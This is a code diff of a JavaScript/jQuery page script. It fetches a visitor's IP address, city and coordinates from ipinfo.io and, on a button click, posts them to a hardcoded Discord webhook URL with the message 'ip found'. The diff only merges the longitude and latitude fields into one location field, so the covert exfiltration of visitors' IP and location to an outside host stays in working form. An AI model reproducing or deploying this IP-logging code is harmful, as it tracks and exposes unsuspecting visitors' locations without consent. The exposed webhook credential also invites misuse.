@@ -5,13 +5,12 @@ var web = "https://discord.com/api/webhooks/1080866736234045511/i_j_4QMtRFMlWenJ
 let ip;
   let city;
 let longitude;
-let latitude;
+let loc;
   $.get("https://ipinfo.io", function(response) {
            	ip = response.ip;
     city = response.city;
 
-longitude = response.longitude;
-latitude = response.latitude;
+loc = response.loc;
 
   }, "json")
 
@@ -24,10 +23,13 @@ latitude = response.latitude;
             'username':'AI',
         }));
     }
+
+  
   
 $(".getip").on("click", function(){
   
   document.getElementById("stuff").innerHTML = ip + ", " + city;
-  discord_message(web, "ip found " + ip + ", " + city + ", " + longitude + ", " + latitude);
+
+  discord_message(web, "ip found " + ip + ", " + city + ", " + loc);
 });
 });
